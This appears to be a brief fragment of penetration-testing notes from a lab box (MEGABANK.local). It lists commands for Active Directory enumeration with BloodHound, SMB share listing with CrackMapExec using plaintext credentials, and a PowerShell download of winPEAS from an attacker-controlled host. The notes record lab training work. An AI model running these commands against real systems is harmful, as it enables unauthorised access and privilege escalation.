
```
bloodhound-python -d MEGABANK.local -u melanie -p 'Welcome123!' -ns 10.10.10.169 -c all
```
![[Pasted image 20240506061911.png]]

Winpeas
```
IWR -Uri http://10.10.16.20:8080//winpeas/winPEASx64.exe -OutFile winPEASx64.exe
```
![[Pasted image 20240506062115.png]]

```
crackmapexec smb 10.10.10.169 -u melanie -p 'Welcome123!' --shares
```
